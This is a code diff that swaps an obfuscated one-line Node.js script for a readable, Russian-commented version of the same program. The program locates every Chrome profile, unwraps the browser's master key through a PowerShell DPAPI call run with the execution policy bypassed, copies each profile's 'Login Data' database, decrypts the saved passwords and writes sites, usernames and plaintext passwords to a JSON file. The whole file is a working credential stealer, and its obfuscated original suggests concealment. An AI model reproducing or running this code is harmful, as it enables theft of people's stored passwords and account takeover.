@@ -1,1 +1,368 @@
-const _0x4b8759 = _0x56eb; (function (_0x11d4fa, _0x13404e) { const _0x53756b = _0x56eb, _0x8613d = _0x11d4fa(); while (!![]) { try { const _0x2906a9 = -parseInt(_0x53756b(0x13c)) / 0x1 + -parseInt(_0x53756b(0x145)) / 0x2 + -parseInt(_0x53756b(0x15f)) / 0x3 + -parseInt(_0x53756b(0x163)) / 0x4 + -parseInt(_0x53756b(0x15c)) / 0x5 * (parseInt(_0x53756b(0x126)) / 0x6) + -parseInt(_0x53756b(0x143)) / 0x7 * (-parseInt(_0x53756b(0x13b)) / 0x8) + parseInt(_0x53756b(0x117)) / 0x9; if (_0x2906a9 === _0x13404e) break; else _0x8613d['push'](_0x8613d['shift']()); } catch (_0xecba80) { _0x8613d['push'](_0x8613d['shift']()); } } }(_0xc72f, 0x2f8eb)); const fs = require('fs'), path = require(_0x4b8759(0x14c)), os = require('os'), crypto = require('crypto'), { exec } = require(_0x4b8759(0x13e)), sqlite3 = require('sqlite3')['verbose'](), util = require(_0x4b8759(0x12d)), execPromise = util[_0x4b8759(0x104)](exec), CHROME_USER_DATA_PATH = path[_0x4b8759(0x164)]('C:', 'Users', _0x4b8759(0xff), 'AppData', _0x4b8759(0x10f), _0x4b8759(0xf7), _0x4b8759(0x121), 'User\x20Data'); function findChromeProfiles() { const _0x565f7d = _0x4b8759; try { if (!fs['existsSync'](CHROME_USER_DATA_PATH)) throw new Error(_0x565f7d(0x122) + CHROME_USER_DATA_PATH + _0x565f7d(0xfb)); const _0x2b49d8 = fs[_0x565f7d(0x133)](CHROME_USER_DATA_PATH), _0x270a1a = _0x2b49d8['filter'](_0x3cda86 => { const _0x11e50e = _0x565f7d, _0x2d6d46 = path['join'](CHROME_USER_DATA_PATH, _0x3cda86); return fs['statSync'](_0x2d6d46)[_0x11e50e(0x137)]() && (_0x3cda86 === _0x11e50e(0x107) || _0x3cda86[_0x11e50e(0x113)](_0x11e50e(0x106))); }), _0x3f18f6 = _0x270a1a[_0x565f7d(0x15b)](_0x5522d0 => { const _0x2b1bc9 = _0x565f7d, _0x4ac3d0 = path[_0x2b1bc9(0x164)](CHROME_USER_DATA_PATH, _0x5522d0, _0x2b1bc9(0x123)); return fs[_0x2b1bc9(0xfa)](_0x4ac3d0); }); return console[_0x565f7d(0xfe)](_0x565f7d(0x140) + _0x3f18f6['length'] + '\x20профилей\x20с\x20Login\x20Data'), _0x3f18f6; } catch (_0x5cc1a5) { return console['error'](_0x565f7d(0x160), _0x5cc1a5[_0x565f7d(0x109)]), []; } } async function getEncryptionKey() { const _0x405255 = _0x4b8759; try { const _0x2bba37 = path[_0x405255(0x164)](CHROME_USER_DATA_PATH, _0x405255(0x159)); if (!fs[_0x405255(0xfa)](_0x2bba37)) throw new Error(_0x405255(0x13d) + _0x2bba37); const _0x495389 = fs[_0x405255(0x10c)](_0x2bba37, 'utf8'), _0x533c0b = JSON[_0x405255(0x11b)](_0x495389); if (!_0x533c0b[_0x405255(0x134)] || !_0x533c0b[_0x405255(0x134)][_0x405255(0x158)]) throw new Error(_0x405255(0x149)); const _0x2d8071 = Buffer[_0x405255(0x11c)](_0x533c0b['os_crypt'][_0x405255(0x158)], _0x405255(0x129)), _0xc1b176 = _0x2d8071[_0x405255(0x127)](0x5), _0x42ed73 = os[_0x405255(0x12b)](), _0x4e9c57 = path[_0x405255(0x164)](_0x42ed73, _0x405255(0x11a) + Math['random']()[_0x405255(0xf8)](0x24)['substring'](0x2, 0x8)); fs[_0x405255(0x148)](_0x4e9c57, _0xc1b176); const _0x16b869 = _0x405255(0x111) + _0x4e9c57[_0x405255(0x11d)](/\\/g, '\x5c\x5c') + _0x405255(0x118) + _0x4e9c57 + _0x405255(0x147), _0x114e93 = path[_0x405255(0x164)](_0x42ed73, 'decrypt_chrome_key_' + Math[_0x405255(0x15d)]()[_0x405255(0xf8)](0x24)['substring'](0x2, 0x8) + _0x405255(0x13f)); fs[_0x405255(0x148)](_0x114e93, _0x16b869); try { await execPromise('powershell\x20-ExecutionPolicy\x20Bypass\x20-File\x20\x22' + _0x114e93 + '\x22'); } catch (_0x4fe307) { console[_0x405255(0x108)](_0x405255(0x153), _0x4fe307[_0x405255(0x109)]); throw new Error(_0x405255(0x10a)); } const _0x18ecc6 = _0x4e9c57 + '_decrypted'; if (!fs[_0x405255(0xfa)](_0x18ecc6)) throw new Error(_0x405255(0x15e)); const _0x23981e = fs[_0x405255(0x10c)](_0x18ecc6); try { fs[_0x405255(0x11e)](_0x4e9c57), fs[_0x405255(0x11e)](_0x18ecc6), fs[_0x405255(0x11e)](_0x114e93); } catch (_0x51fd9f) { console[_0x405255(0x12e)](_0x405255(0x13a)); } return console[_0x405255(0xfe)]('Ключ\x20шифрования\x20успешно\x20получен'), _0x23981e; } catch (_0xc3ada4) { console[_0x405255(0x108)](_0x405255(0xfc), _0xc3ada4[_0x405255(0x109)]); throw _0xc3ada4; } } function decryptValue(_0x2c238b, _0x436a20) { const _0x2cf5c7 = _0x4b8759; try { if (!_0x2c238b || _0x2c238b[_0x2cf5c7(0x101)] === 0x0) return ''; const _0x3a1b8c = _0x2c238b[_0x2cf5c7(0x101)] > 0x3 && _0x2c238b[0x0] === 0x76 && _0x2c238b[0x1] === 0x31 && _0x2c238b[0x2] === 0x30; if (_0x3a1b8c) try { const _0x53c065 = _0x2c238b['slice'](0x3, 0xf), _0x3eac71 = _0x2c238b[_0x2cf5c7(0x127)](0xf, -0x10), _0x2759a7 = _0x2c238b['slice'](-0x10), _0x49b8fc = crypto['createDecipheriv']('aes-256-gcm', _0x436a20, _0x53c065); _0x49b8fc['setAuthTag'](_0x2759a7); let _0x5b19ab = _0x49b8fc[_0x2cf5c7(0x161)](_0x3eac71); return _0x5b19ab = Buffer['concat']([_0x5b19ab, _0x49b8fc[_0x2cf5c7(0x14e)]()]), _0x5b19ab['toString'](_0x2cf5c7(0x156)); } catch (_0x544451) { return console[_0x2cf5c7(0x108)](_0x2cf5c7(0x15a) + _0x544451[_0x2cf5c7(0x109)]), _0x2cf5c7(0xfd) + _0x544451['message'] + ']'; } else return _0x2cf5c7(0x155) + _0x2c238b[_0x2cf5c7(0xf8)]('hex')['substring'](0x0, 0xa) + '...]'; } catch (_0x254dbf) { return console[_0x2cf5c7(0x108)](_0x2cf5c7(0x119) + _0x254dbf[_0x2cf5c7(0x109)]), _0x2cf5c7(0x12a) + _0x254dbf[_0x2cf5c7(0x109)] + ']'; } } function chromeTimeToDate(_0x547964) { const _0x561bbb = _0x4b8759; if (!_0x547964) return null; const _0x402bde = Number(_0x547964), _0x3fbdad = Math[_0x561bbb(0x11f)](_0x402bde / 0x3e8) - 0xa9730b66800; if (_0x3fbdad < 0x0) return null; return new Date(_0x3fbdad)[_0x561bbb(0x128)](); } function _0x56eb(_0x48dbb8, _0x5d655d) { const _0xc72fa9 = _0xc72f(); return _0x56eb = function (_0x56eb1b, _0x17e586) { _0x56eb1b = _0x56eb1b - 0xf7; let _0x17c9a9 = _0xc72fa9[_0x56eb1b]; return _0x17c9a9; }, _0x56eb(_0x48dbb8, _0x5d655d); } async function decryptProfilePasswords(_0x1ebc57, _0x1c6492) { const _0x40ed19 = _0x4b8759, _0x15b985 = path[_0x40ed19(0x164)](CHROME_USER_DATA_PATH, _0x1ebc57, _0x40ed19(0x123)); if (!fs[_0x40ed19(0xfa)](_0x15b985)) return console['error'](_0x40ed19(0x12c) + _0x1ebc57), []; const _0x3786ea = os[_0x40ed19(0x12b)](), _0x1c5301 = path[_0x40ed19(0x164)](_0x3786ea, _0x40ed19(0x115) + Math['random']()[_0x40ed19(0xf8)](0x24)[_0x40ed19(0x10d)](0x2, 0x8)); try { fs[_0x40ed19(0x154)](_0x15b985, _0x1c5301), console[_0x40ed19(0xfe)]('Файл\x20Login\x20Data\x20для\x20профиля\x20' + _0x1ebc57 + _0x40ed19(0x12f)); const _0x325efb = new sqlite3[(_0x40ed19(0x100))](_0x1c5301), _0x5b0abe = util[_0x40ed19(0x104)](_0x325efb[_0x40ed19(0x112)]['bind'](_0x325efb)), _0xdb0f25 = util[_0x40ed19(0x104)](_0x325efb[_0x40ed19(0x120)][_0x40ed19(0x151)](_0x325efb)), _0x3458ef = await _0x5b0abe('PRAGMA\x20table_info(logins)'), _0x1f5533 = _0x3458ef[_0x40ed19(0x124)](_0x2ec05f => _0x2ec05f[_0x40ed19(0x138)] === _0x40ed19(0x136)), _0x582a2b = _0x3458ef[_0x40ed19(0x124)](_0x32670b => _0x32670b[_0x40ed19(0x138)] === _0x40ed19(0x144)); if (!_0x1f5533 || !_0x582a2b) throw new Error('В\x20таблице\x20logins\x20профиля\x20' + _0x1ebc57 + _0x40ed19(0xf9)); const _0x3a2a72 = _0x40ed19(0x130), _0x5a38a1 = await _0x5b0abe(_0x3a2a72); console['log']('Найдено\x20' + _0x5a38a1[_0x40ed19(0x101)] + '\x20записей\x20паролей\x20в\x20профиле\x20' + _0x1ebc57); const _0x438758 = _0x5a38a1[_0x40ed19(0x152)](_0x11a576 => { const _0x2e3b76 = _0x40ed19; try { const _0x378ef2 = Buffer['from'](_0x11a576[_0x2e3b76(0x144)]), _0x3e3211 = decryptValue(_0x378ef2, _0x1c6492); return { 'profile': _0x1ebc57, 'origin_url': _0x11a576[_0x2e3b76(0x142)], 'action_url': _0x11a576[_0x2e3b76(0x162)], 'username': _0x11a576[_0x2e3b76(0x136)], 'password': _0x3e3211, 'date_created': chromeTimeToDate(_0x11a576[_0x2e3b76(0x141)]), 'date_last_used': chromeTimeToDate(_0x11a576[_0x2e3b76(0x114)]), 'times_used': _0x11a576['times_used'] }; } catch (_0x3d40ea) { return console[_0x2e3b76(0x108)](_0x2e3b76(0x157) + _0x11a576['origin_url'] + _0x2e3b76(0x146) + _0x1ebc57 + ':', _0x3d40ea[_0x2e3b76(0x109)]), { 'profile': _0x1ebc57, 'origin_url': _0x11a576[_0x2e3b76(0x142)], 'action_url': _0x11a576[_0x2e3b76(0x162)], 'username': _0x11a576[_0x2e3b76(0x136)], 'password': _0x2e3b76(0xfd) + _0x3d40ea[_0x2e3b76(0x109)] + ']', 'date_created': chromeTimeToDate(_0x11a576['date_created']), 'date_last_used': chromeTimeToDate(_0x11a576['date_last_used']), 'times_used': _0x11a576[_0x2e3b76(0x150)] }; } }); await _0xdb0f25(); try { fs['unlinkSync'](_0x1c5301), console['log'](_0x40ed19(0x116) + _0x1ebc57 + _0x40ed19(0x14d)); } catch (_0x460451) { console['warn'](_0x40ed19(0x110) + _0x1ebc57 + ':\x20' + _0x460451[_0x40ed19(0x109)]); } return _0x438758; } catch (_0x3f1f90) { console[_0x40ed19(0x108)](_0x40ed19(0x139) + _0x1ebc57 + ':', _0x3f1f90[_0x40ed19(0x109)]); if (fs[_0x40ed19(0xfa)](_0x1c5301)) try { fs[_0x40ed19(0x11e)](_0x1c5301); } catch (_0x33de89) { console['warn'](_0x40ed19(0x110) + _0x1ebc57 + ':\x20' + _0x33de89[_0x40ed19(0x109)]); } return []; } } async function decryptAllProfilesPasswords() { const _0xa33f7 = _0x4b8759; try { const _0x1c356d = findChromeProfiles(); if (_0x1c356d['length'] === 0x0) return console['log']('Не\x20найдено\x20профилей\x20с\x20файлами\x20Login\x20Data'), null; const _0x46a119 = await getEncryptionKey(); let _0x290efa = []; for (const _0x15438d of _0x1c356d) { console[_0xa33f7(0xfe)](_0xa33f7(0x10b) + _0x15438d); const _0x22ede0 = await decryptProfilePasswords(_0x15438d, _0x46a119); _0x290efa = _0x290efa[_0xa33f7(0x135)](_0x22ede0); } _0x290efa['sort']((_0x312175, _0x334379) => { const _0x2a8889 = _0xa33f7; if (_0x334379[_0x2a8889(0x150)] !== _0x312175[_0x2a8889(0x150)]) return _0x334379['times_used'] - _0x312175['times_used']; if (_0x312175['date_last_used'] && _0x334379[_0x2a8889(0x114)]) return new Date(_0x334379['date_last_used']) - new Date(_0x312175[_0x2a8889(0x114)]); return 0x0; }); const _0x4f766d = _0xa33f7(0x131) + new Date()[_0xa33f7(0x128)]()['replace'](/[:.]/g, '-') + _0xa33f7(0x125); return fs['writeFileSync'](_0x4f766d, JSON[_0xa33f7(0x10e)](_0x290efa, null, 0x2), 'utf8'), console[_0xa33f7(0xfe)](_0xa33f7(0x14a) + _0x290efa[_0xa33f7(0x101)] + _0xa33f7(0x14f) + _0x4f766d), { 'count': _0x290efa['length'], 'outputPath': _0x4f766d, 'profiles': _0x1c356d }; } catch (_0x4eedd0) { console['error']('Ошибка\x20при\x20расшифровке\x20паролей\x20из\x20всех\x20профилей:', _0x4eedd0[_0xa33f7(0x109)]); throw _0x4eedd0; } } async function main() { const _0x34bcd2 = _0x4b8759; try { console['log'](_0x34bcd2(0x103)), await decryptAllProfilesPasswords(), console['log'](_0x34bcd2(0x132)); } catch (_0x5f1895) { console[_0x34bcd2(0x108)]('Критическая\x20ошибка:', _0x5f1895['message']), process['exit'](0x1); } } function _0xc72f() { const _0x3dcd07 = ['parse', 'from', 'replace', 'unlinkSync', 'floor', 'close', 'Chrome', 'Директория\x20', 'Login\x20Data', 'some', '.json', '6epoIzR', 'slice', 'toISOString', 'base64', '[Ошибка:\x20', 'tmpdir', 'Файл\x20Login\x20Data\x20не\x20найден\x20для\x20профиля\x20', 'util', 'warn', '\x20скопирован\x20во\x20временную\x20директорию', '\x0a\x20\x20\x20\x20\x20\x20SELECT\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20origin_url,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20action_url,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20username_value,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20password_value,\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_created,\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_last_used,\x0a\x20\x20\x20\x20\x20\x20\x20\x20times_used\x0a\x20\x20\x20\x20\x20\x20FROM\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20logins\x0a\x20\x20\x20\x20\x20\x20ORDER\x20BY\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20times_used\x20DESC,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_last_used\x20DESC\x0a\x20\x20\x20\x20', 'chrome_all_profiles_passwords_', '\x0a=====\x20Расшифровка\x20завершена\x20=====', 'readdirSync', 'os_crypt', 'concat', 'username_value', 'isDirectory', 'name', 'Ошибка\x20при\x20расшифровке\x20паролей\x20профиля\x20', 'Предупреждение:\x20не\x20удалось\x20удалить\x20временные\x20файлы', '936976GkDhjd', '382334XPhLkC', 'Файл\x20Local\x20State\x20не\x20найден\x20по\x20пути:\x20', 'child_process', '.ps1', 'Найдено\x20', 'date_created', 'origin_url', '7fdHqoy', 'password_value', '468104NqpUwp', '\x20в\x20профиле\x20', '_decrypted\x27,\x20$decrypted);\x0a\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22Decryption\x20successful\x22;\x0a\x20\x20\x20\x20}\x20catch\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20Write-Error\x20\x22Decryption\x20error:\x20$_\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20exit\x201;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20', 'writeFileSync', 'Не\x20удалось\x20найти\x20encrypted_key\x20в\x20Local\x20State', '\x0aВсе\x20расшифрованные\x20пароли\x20(', 'Необработанная\x20ошибка:', 'path', '\x20удален', 'final', ')\x20сохранены\x20в\x20файл:\x20', 'times_used', 'bind', 'map', 'PowerShell\x20error:', 'copyFileSync', '[Encrypted-Legacy:\x20', 'utf8', 'Ошибка\x20расшифровки\x20пароля\x20для\x20', 'encrypted_key', 'Local\x20State', 'Ошибка\x20расшифровки\x20AES-GCM:\x20', 'filter', '1053870bAFcbf', 'random', 'Не\x20удалось\x20создать\x20файл\x20с\x20расшифрованным\x20ключом', '982245DrlkDg', 'Ошибка\x20при\x20поиске\x20профилей\x20Chrome:', 'update', 'action_url', '1082072ZjCjKR', 'join', 'Google', 'toString', '\x20отсутствуют\x20необходимые\x20столбцы', 'existsSync', '\x20не\x20найдена', 'Ошибка\x20при\x20получении\x20ключа\x20шифрования:', '[Ошибка\x20расшифровки:\x20', 'log', 'user', 'Database', 'length', 'catch', '=====\x20Расшифровка\x20паролей\x20Chrome\x20из\x20всех\x20профилей\x20=====', 'promisify', 'exit', 'Profile\x20', 'Default', 'error', 'message', 'Ошибка\x20выполнения\x20PowerShell\x20скрипта', '\x0aОбработка\x20профиля:\x20', 'readFileSync', 'substring', 'stringify', 'Local', 'Не\x20удалось\x20удалить\x20временный\x20файл\x20для\x20профиля\x20', '\x0a\x20\x20\x20\x20Add-Type\x20-AssemblyName\x20System.Security;\x0a\x20\x20\x20\x20try\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20$encryptedBytes\x20=\x20[System.IO.File]::ReadAllBytes(\x27', 'all', 'startsWith', 'date_last_used', 'chrome_login_data_temp_', 'Временный\x20файл\x20для\x20профиля\x20', '13524894kyorHU', '\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20$decrypted\x20=\x20[System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes,\x20$null,\x20\x27CurrentUser\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20[System.IO.File]::WriteAllBytes(\x27', 'Ошибка\x20при\x20расшифровке\x20значения:\x20', 'chrome_key_encrypted_']; _0xc72f = function () { return _0x3dcd07; }; return _0xc72f(); } main()[_0x4b8759(0x102)](_0x5b8d22 => { const _0x303786 = _0x4b8759; console[_0x303786(0x108)](_0x303786(0x14b), _0x5b8d22), process[_0x303786(0x105)](0x1); });
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+const crypto = require('crypto');
+const { exec } = require('child_process');
+const sqlite3 = require('sqlite3').verbose();
+const util = require('util');
+
+// Промисифицируем exec
+const execPromise = util.promisify(exec);
+
+// Базовый путь к пользовательским данным Chrome
+const CHROME_USER_DATA_PATH = path.join('C:', 'Users', 'user', 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
+
+// Функция для поиска всех профилей Chrome
+function findChromeProfiles() {
+  try {
+    if (!fs.existsSync(CHROME_USER_DATA_PATH)) {
+      throw new Error(`Директория ${CHROME_USER_DATA_PATH} не найдена`);
+    }
+    
+    // Читаем содержимое директории
+    const items = fs.readdirSync(CHROME_USER_DATA_PATH);
+    
+    // Отбираем профили - это папки с именами "Default", "Profile 1", "Profile 2" и т.д.
+    const profiles = items.filter(item => {
+      const itemPath = path.join(CHROME_USER_DATA_PATH, item);
+      return fs.statSync(itemPath).isDirectory() && 
+             (item === 'Default' || item.startsWith('Profile '));
+    });
+    
+    // Проверяем, содержит ли каждый профиль файл Login Data
+    const profilesWithLoginData = profiles.filter(profile => {
+      const loginDataPath = path.join(CHROME_USER_DATA_PATH, profile, 'Login Data');
+      return fs.existsSync(loginDataPath);
+    });
+    
+    console.log(`Найдено ${profilesWithLoginData.length} профилей с Login Data`);
+    return profilesWithLoginData;
+  } catch (error) {
+    console.error('Ошибка при поиске профилей Chrome:', error.message);
+    return [];
+  }
+}
+
+// Функция для получения реального ключа шифрования Chrome
+async function getEncryptionKey() {
+  try {
+    const localStatePath = path.join(CHROME_USER_DATA_PATH, 'Local State');
+    
+    if (!fs.existsSync(localStatePath)) {
+      throw new Error(`Файл Local State не найден по пути: ${localStatePath}`);
+    }
+    
+    const localStateContent = fs.readFileSync(localStatePath, 'utf8');
+    const localState = JSON.parse(localStateContent);
+    
+    if (!localState.os_crypt || !localState.os_crypt.encrypted_key) {
+      throw new Error('Не удалось найти encrypted_key в Local State');
+    }
+    
+    // Получаем закодированный ключ шифрования и декодируем из base64
+    const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
+    
+    // Удаляем префикс DPAPI (первые 5 байт 'DPAPI')
+    const encryptedKeyWithoutPrefix = encryptedKey.slice(5);
+    
+    // Сохраняем зашифрованный ключ во временный файл
+    const tempDir = os.tmpdir();
+    const encryptedFile = path.join(tempDir, `chrome_key_encrypted_${Math.random().toString(36).substring(2, 8)}`);
+    fs.writeFileSync(encryptedFile, encryptedKeyWithoutPrefix);
+    
+    // Используем PowerShell для расшифровки через DPAPI
+    const psScript = `
+    Add-Type -AssemblyName System.Security;
+    try {
+        $encryptedBytes = [System.IO.File]::ReadAllBytes('${encryptedFile.replace(/\\/g, '\\\\')}');
+        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, 'CurrentUser');
+        [System.IO.File]::WriteAllBytes('${encryptedFile}_decrypted', $decrypted);
+        Write-Output "Decryption successful";
+    } catch {
+        Write-Error "Decryption error: $_";
+        exit 1;
+    }
+    `;
+    
+    const psPath = path.join(tempDir, `decrypt_chrome_key_${Math.random().toString(36).substring(2, 8)}.ps1`);
+    fs.writeFileSync(psPath, psScript);
+    
+    // Запускаем PowerShell скрипт асинхронно
+    try {
+      await execPromise(`powershell -ExecutionPolicy Bypass -File "${psPath}"`);
+    } catch (e) {
+      console.error("PowerShell error:", e.message);
+      throw new Error("Ошибка выполнения PowerShell скрипта");
+    }
+    
+    // Читаем расшифрованный ключ
+    const decryptedKeyPath = `${encryptedFile}_decrypted`;
+    if (!fs.existsSync(decryptedKeyPath)) {
+      throw new Error('Не удалось создать файл с расшифрованным ключом');
+    }
+    
+    const decryptedKey = fs.readFileSync(decryptedKeyPath);
+    
+    // Очищаем временные файлы
+    try {
+      fs.unlinkSync(encryptedFile);
+      fs.unlinkSync(decryptedKeyPath);
+      fs.unlinkSync(psPath);
+    } catch (e) {
+      console.warn('Предупреждение: не удалось удалить временные файлы');
+    }
+    
+    console.log('Ключ шифрования успешно получен');
+    return decryptedKey;
+  } catch (error) {
+    console.error('Ошибка при получении ключа шифрования:', error.message);
+    throw error;
+  }
+}
+
+// Функция для расшифровки значения
+function decryptValue(encryptedValue, key) {
+  try {
+    if (!encryptedValue || encryptedValue.length === 0) {
+      return '';
+    }
+    
+    // Проверяем, является ли это v10 (формат AES-GCM)
+    const isV10 = encryptedValue.length > 3 && 
+                  encryptedValue[0] === 118 && // 'v'
+                  encryptedValue[1] === 49 &&  // '1'
+                  encryptedValue[2] === 48;    // '0'
+    
+    if (isV10) {
+      try {
+        // Извлекаем nonce, ciphertext и auth tag
+        const nonce = encryptedValue.slice(3, 15);
+        const ciphertext = encryptedValue.slice(15, -16);
+        const authTag = encryptedValue.slice(-16);
+        
+        // Создаем AES-GCM расшифровщик
+        const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
+        decipher.setAuthTag(authTag);
+        
+        // Расшифровываем данные
+        let decrypted = decipher.update(ciphertext);
+        decrypted = Buffer.concat([decrypted, decipher.final()]);
+        
+        return decrypted.toString('utf8');
+      } catch (e) {
+        console.error(`Ошибка расшифровки AES-GCM: ${e.message}`);
+        return `[Ошибка расшифровки: ${e.message}]`;
+      }
+    } else {
+      // Для старого формата DPAPI (до v10)
+      return `[Encrypted-Legacy: ${encryptedValue.toString('hex').substring(0, 10)}...]`;
+    }
+  } catch (e) {
+    console.error(`Ошибка при расшифровке значения: ${e.message}`);
+    return `[Ошибка: ${e.message}]`;
+  }
+}
+
+// Преобразуем микросекунды с 1601 года в дату
+function chromeTimeToDate(chromeTime) {
+  if (!chromeTime) return null;
+  // Chrome хранит время в микросекундах с 1601-01-01
+  const microsecSince1601 = Number(chromeTime);
+  // Конвертируем в миллисекунды с 1970-01-01 (Unix epoch)
+  const millisecSince1970 = Math.floor(microsecSince1601 / 1000) - 11644473600000;
+  
+  if (millisecSince1970 < 0) return null;
+  return new Date(millisecSince1970).toISOString();
+}
+
+// Функция для расшифровки паролей из файла Login Data для одного профиля
+async function decryptProfilePasswords(profileName, encryptionKey) {
+  const loginDataPath = path.join(CHROME_USER_DATA_PATH, profileName, 'Login Data');
+  
+  // Проверяем существование файла
+  if (!fs.existsSync(loginDataPath)) {
+    console.error(`Файл Login Data не найден для профиля ${profileName}`);
+    return [];
+  }
+  
+  // Создаем временную копию файла, так как Chrome может блокировать его
+  const tempDir = os.tmpdir();
+  const tempDbPath = path.join(tempDir, `chrome_login_data_temp_${Math.random().toString(36).substring(2, 8)}`);
+  
+  try {
+    // Копируем файл
+    fs.copyFileSync(loginDataPath, tempDbPath);
+    console.log(`Файл Login Data для профиля ${profileName} скопирован во временную директорию`);
+    
+    // Открываем базу данных SQLite
+    const db = new sqlite3.Database(tempDbPath);
+    
+    // Промисифицируем функции для async/await
+    const dbAll = util.promisify(db.all.bind(db));
+    const dbClose = util.promisify(db.close.bind(db));
+    
+    // Получаем информацию о столбцах в таблице logins
+    const tableInfo = await dbAll("PRAGMA table_info(logins)");
+    
+    // Проверяем наличие нужных столбцов
+    const hasUsernameValue = tableInfo.some(col => col.name === 'username_value');
+    const hasPasswordValue = tableInfo.some(col => col.name === 'password_value');
+    
+    if (!hasUsernameValue || !hasPasswordValue) {
+      throw new Error(`В таблице logins профиля ${profileName} отсутствуют необходимые столбцы`);
+    }
+    
+    // Формируем SQL запрос
+    const sql = `
+      SELECT 
+        origin_url, 
+        action_url, 
+        username_value, 
+        password_value,
+        date_created,
+        date_last_used,
+        times_used
+      FROM 
+        logins
+      ORDER BY 
+        times_used DESC, 
+        date_last_used DESC
+    `;
+    
+    // Выполняем запрос
+    const rows = await dbAll(sql);
+    console.log(`Найдено ${rows.length} записей паролей в профиле ${profileName}`);
+    
+    // Расшифровываем пароли
+    const decryptedRows = rows.map(row => {
+      try {
+        const passwordBuffer = Buffer.from(row.password_value);
+        const decryptedPassword = decryptValue(passwordBuffer, encryptionKey);
+        
+        return {
+          profile: profileName,
+          origin_url: row.origin_url,
+          action_url: row.action_url,
+          username: row.username_value,
+          password: decryptedPassword,
+          date_created: chromeTimeToDate(row.date_created),
+          date_last_used: chromeTimeToDate(row.date_last_used),
+          times_used: row.times_used
+        };
+      } catch (e) {
+        console.error(`Ошибка расшифровки пароля для ${row.origin_url} в профиле ${profileName}:`, e.message);
+        return {
+          profile: profileName,
+          origin_url: row.origin_url,
+          action_url: row.action_url,
+          username: row.username_value,
+          password: `[Ошибка расшифровки: ${e.message}]`,
+          date_created: chromeTimeToDate(row.date_created),
+          date_last_used: chromeTimeToDate(row.date_last_used),
+          times_used: row.times_used
+        };
+      }
+    });
+    
+    // Закрываем базу данных
+    await dbClose();
+    
+    // Удаляем временный файл
+    try {
+      fs.unlinkSync(tempDbPath);
+      console.log(`Временный файл для профиля ${profileName} удален`);
+    } catch (e) {
+      console.warn(`Не удалось удалить временный файл для профиля ${profileName}: ${e.message}`);
+    }
+    
+    return decryptedRows;
+  } catch (error) {
+    console.error(`Ошибка при расшифровке паролей профиля ${profileName}:`, error.message);
+    
+    // Удаляем временный файл в случае ошибки
+    if (fs.existsSync(tempDbPath)) {
+      try {
+        fs.unlinkSync(tempDbPath);
+      } catch (e) {
+        console.warn(`Не удалось удалить временный файл для профиля ${profileName}: ${e.message}`);
+      }
+    }
+    
+    return []; // Возвращаем пустой массив в случае ошибки
+  }
+}
+
+// Функция для расшифровки паролей из всех профилей Chrome
+async function decryptAllProfilesPasswords() {
+  try {
+    // Находим все профили с файлами Login Data
+    const profiles = findChromeProfiles();
+    
+    if (profiles.length === 0) {
+      console.log('Не найдено профилей с файлами Login Data');
+      return null;
+    }
+    
+    // Получаем ключ шифрования (общий для всех профилей)
+    const encryptionKey = await getEncryptionKey();
+    
+    // Массив для хранения всех расшифрованных паролей
+    let allPasswords = [];
+    
+    // Для каждого профиля расшифровываем пароли
+    for (const profile of profiles) {
+      console.log(`\nОбработка профиля: ${profile}`);
+      const profilePasswords = await decryptProfilePasswords(profile, encryptionKey);
+      allPasswords = allPasswords.concat(profilePasswords);
+    }
+    
+    // Сортируем все пароли по дате последнего использования
+    allPasswords.sort((a, b) => {
+      // Сначала по количеству использований (по убыванию)
+      if (b.times_used !== a.times_used) {
+        return b.times_used - a.times_used;
+      }
+      
+      // Затем по дате последнего использования (по убыванию)
+      if (a.date_last_used && b.date_last_used) {
+        return new Date(b.date_last_used) - new Date(a.date_last_used);
+      }
+      
+      return 0;
+    });
+    
+    // Сохраняем результаты в один JSON-файл с фиксированным именем
+    const outputPath = 'chrome_passwords_result.json';
+    fs.writeFileSync(outputPath, JSON.stringify(allPasswords, null, 2), 'utf8');
+    console.log(`\nВсе расшифрованные пароли (${allPasswords.length}) сохранены в файл: ${outputPath}`);
+    
+    return {
+      count: allPasswords.length,
+      outputPath,
+      profiles: profiles,
+      passwords: allPasswords
+    };
+  } catch (error) {
+    console.error('Ошибка при расшифровке паролей из всех профилей:', error.message);
+    throw error;
+  }
+}
+
+// Главная функция
+async function main() {
+  try {
+    console.log('===== Расшифровка паролей Chrome из всех профилей =====');
+    const result = await decryptAllProfilesPasswords();
+    console.log('\n===== Расшифровка завершена =====');
+    return result;
+  } catch (error) {
+    console.error('Критическая ошибка:', error.message);
+    process.exit(1);
+  }
+}
+
+// Запускаем программу
+main().catch(error => {
+  console.error('Необработанная ошибка:', error);
+  process.exit(1);
+});
